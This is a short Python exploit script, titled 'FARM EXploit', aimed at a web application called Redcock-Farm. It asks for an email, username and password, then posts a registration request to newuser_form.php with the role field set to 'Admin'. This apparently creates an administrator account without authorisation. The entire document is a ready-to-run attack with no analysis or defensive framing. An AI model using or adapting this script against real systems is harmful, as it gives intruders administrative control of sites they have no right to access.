import requests 
print ("FARM EXploit - Az7rb@Or4ng\n")
email = input("Email : ")
user = input("user : ")
pas  = input("password : ")
postdata = {'dignity':'Admin','fullname':'firstname','lastname':'lastname','username':user,'password':pas,'confirmpassword':pas,'staffid':'1','signup':'Register','emailid':email,'mobileno':'05554444'}
resp = requests.post("http://localhost/Redcock-Farm/farm/newuser_form.php", postdata)
if "1" in resp.text:
    print("[+] user : "+user)
    print("[+] password : "+pas)
else:
    print("Error ...")
    